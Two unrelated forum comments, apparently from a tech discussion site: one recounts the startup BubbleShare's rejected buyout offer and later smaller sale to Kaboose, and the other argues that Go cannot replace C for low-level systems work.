They were WAY ahead of their time.<p>All I'm comfortable sharing here is that they received buyout Offer A, which Albert rejected in favour of doubling down for a better deal. Unfortunately fortune did not smile and BubbleShare ultimately accepted Offer B, which was significantly smaller than Offer A.<p>The site was sold to Kaboose, which is a Canadian family content company. As usually happens when startups are acquired, the key talent left (Albert started Kontagent) and innovation on the site halted.<p>I'm not an analyst, but these things usually distill down to ""too early / too early / too late"".

However, asking whether Go can ""replace"" C shows a deep misunderstanding of why people still use C: to do the type of stuff that a safe, typed and garbage collected language won't let you.  Need to poke hardware?  Need to use efficient memory layouts for your data structures that confound non-dependent type systems?  Need exact control over generated code to achieve competitive performance?  (And, apparently for Go's case) need to handle OOM conditions?  (The ""some systems don't even have malloc() return NULL on OOM"" argument was particularly weak.)  True, these things can be handled by C/C++ and called by Go through a FFI, but then C hasn't really been ""replaced"".<p>Really, the title should be ""Can simple C programs be written in Go in about the same number of lines?"" because that's all that was demonstrated.",1305178133
